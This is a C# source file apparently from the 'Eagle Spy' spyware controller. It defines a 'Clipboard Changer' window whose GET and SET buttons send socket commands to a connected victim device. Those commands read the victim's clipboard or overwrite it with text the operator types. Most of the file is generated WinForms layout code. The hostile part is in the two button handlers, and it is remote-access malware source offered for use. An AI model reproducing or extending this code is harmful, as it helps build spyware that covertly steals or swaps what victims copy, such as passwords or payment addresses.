using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Linq;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Eagle_Spy.sockets;
using Microsoft.VisualBasic.CompilerServices;

namespace Eagle_Spy;

[DesignerGenerated]
public class ClipboardManager : Form
{
	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("TOpacity")]
	private Timer _TOpacity;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BTN_GET")]
	private Button _BTN_GET;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("BTN_SET")]
	private Button _BTN_SET;

	public TcpClient Client;

	public Client classClient;

	public string Title;

	private List<Rectangle> RectInputText0;

	internal Timer TOpacity
	;

	internal Panel Panel1
	;

	internal Button BTN_GET
;

	[field: AccessedThroughProperty("BoxClipboard")]
	internal TextBox BoxClipboard
    ;
    private Label label1;
    internal Button BTN_SET
	;

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
				components.Dispose();
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
            this.components = new System.ComponentModel.Container();
            this.TOpacity = new System.Windows.Forms.Timer(this.components);
            this.Panel1 = new System.Windows.Forms.Panel();
            this.label1 = new System.Windows.Forms.Label();
            this.BoxClipboard = new System.Windows.Forms.TextBox();
            this.BTN_SET = new System.Windows.Forms.Button();
            this.BTN_GET = new System.Windows.Forms.Button();
            this.Panel1.SuspendLayout();
            this.SuspendLayout();
            // 
            // TOpacity
            // 
            this.TOpacity.Interval = 1;
            this.TOpacity.Tick += new System.EventHandler(this.TOpacity_Tick);
            // 
            // Panel1
            // 
            this.Panel1.BackColor = System.Drawing.Color.Black;
            this.Panel1.Controls.Add(this.label1);
            this.Panel1.Controls.Add(this.BoxClipboard);
            this.Panel1.Controls.Add(this.BTN_SET);
            this.Panel1.Controls.Add(this.BTN_GET);
            this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.Panel1.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(190)))), ((int)(((byte)(190)))), ((int)(((byte)(190)))));
            this.Panel1.Location = new System.Drawing.Point(0, 0);
            this.Panel1.Name = "Panel1";
            this.Panel1.Size = new System.Drawing.Size(451, 281);
            this.Panel1.TabIndex = 3;
            this.Panel1.Paint += new System.Windows.Forms.PaintEventHandler(this.Panel1_Paint);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Font = new System.Drawing.Font("Bahnschrift SemiBold", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.ForeColor = System.Drawing.Color.Red;
            this.label1.Location = new System.Drawing.Point(99, 14);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(185, 25);
            this.label1.TabIndex = 4;
            this.label1.Text = "Clipboard Changer";
            // 
            // BoxClipboard
            // 
            this.BoxClipboard.BackColor = System.Drawing.Color.Black;
            this.BoxClipboard.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.BoxClipboard.ForeColor = System.Drawing.Color.White;
            this.BoxClipboard.Location = new System.Drawing.Point(19, 51);
            this.BoxClipboard.Multiline = true;
            this.BoxClipboard.Name = "BoxClipboard";
            this.BoxClipboard.Size = new System.Drawing.Size(412, 163);
            this.BoxClipboard.TabIndex = 0;
            // 
            // BTN_SET
            // 
            this.BTN_SET.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.BTN_SET.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.BTN_SET.ForeColor = System.Drawing.Color.Red;
            this.BTN_SET.Location = new System.Drawing.Point(271, 225);
            this.BTN_SET.Name = "BTN_SET";
            this.BTN_SET.Size = new System.Drawing.Size(153, 48);
            this.BTN_SET.TabIndex = 3;
            this.BTN_SET.Text = "SET";
            this.BTN_SET.UseVisualStyleBackColor = true;
            this.BTN_SET.Click += new System.EventHandler(this.BTN_SET_Click);
            // 
            // BTN_GET
            // 
            this.BTN_GET.FlatStyle = System.Windows.Forms.FlatStyle.Flat;
            this.BTN_GET.Font = new System.Drawing.Font("Microsoft Sans Serif", 15.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.BTN_GET.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(0)))), ((int)(((byte)(192)))), ((int)(((byte)(0)))));
            this.BTN_GET.Location = new System.Drawing.Point(34, 225);
            this.BTN_GET.Name = "BTN_GET";
            this.BTN_GET.Size = new System.Drawing.Size(145, 48);
            this.BTN_GET.TabIndex = 1;
            this.BTN_GET.Text = "GET";
            this.BTN_GET.UseVisualStyleBackColor = true;
            this.BTN_GET.Click += new System.EventHandler(this.BTN_GET_Click);
            // 
            // ClipboardManager
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(451, 281);
            this.Controls.Add(this.Panel1);
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedSingle;
            this.MaximizeBox = false;
            this.MaximumSize = new System.Drawing.Size(467, 320);
            this.MinimumSize = new System.Drawing.Size(467, 320);
            this.Name = "ClipboardManager";
            this.Opacity = 0D;
            this.Text = "ClipboardManager";
            this.Panel1.ResumeLayout(false);
            this.Panel1.PerformLayout();
            this.ResumeLayout(false);

	}

	private void ClipboardManager_Load(object sender, EventArgs e)
	{
		base.Icon = new Icon(reso.res_Path + "\\Icons\\win\\20.ico");
		
		Text = Title;
		TOpacity.Interval = SpySettings.T_Interval;
		TOpacity.Enabled = true;
	}

	public ClipboardManager()
	{
		base.Load += ClipboardManager_Load;
		Title = "null";
		RectInputText0 = new List<Rectangle>();
		InitializeComponent();
		Font = reso.f;
	}

	

	private void TOpacity_Tick(object sender, EventArgs e)
	{
		if (base.Opacity != 1.0)
			base.Opacity += 0.1;
		else
			TOpacity.Enabled = false;
	}

	private void Panel1_Paint(object sender, PaintEventArgs e)
	{
		e.Graphics.SmoothingMode = SmoothingMode.AntiAlias;
		Color defaultColor_Foreground = SpySettings.DefaultColor_Foreground;
		if (RectInputText0.Count <= 0)
			return;
		foreach (Rectangle item in RectInputText0)
		{
			if (item.Width > 0)
				e.Graphics.FillRectangle(new SolidBrush(defaultColor_Foreground), item);
		}
	}

	private void BTN_SET_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.resultClient + Data.SPL_SOCKET + "set" + Data.SPL_DATA + BoxClipboard.Text,
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}

	private void BTN_GET_Click(object sender, EventArgs e)
	{
		if (classClient != null)
		{
			object[] parametersObjects = new object[4]
			{
				Client,
				SecurityKey.KeysClient1 + Data.SPL_SOCKET + reso.domen + ".info" + Data.SPL_SOCKET + "method" + Data.SPL_SOCKET + SecurityKey.getClipboard + Data.SPL_SOCKET + "get" + Data.SPL_DATA + "null",
				Codes.Encoding().GetBytes("null"),
				classClient
			};
			classClient.SendMessage(parametersObjects);
		}
	}
}
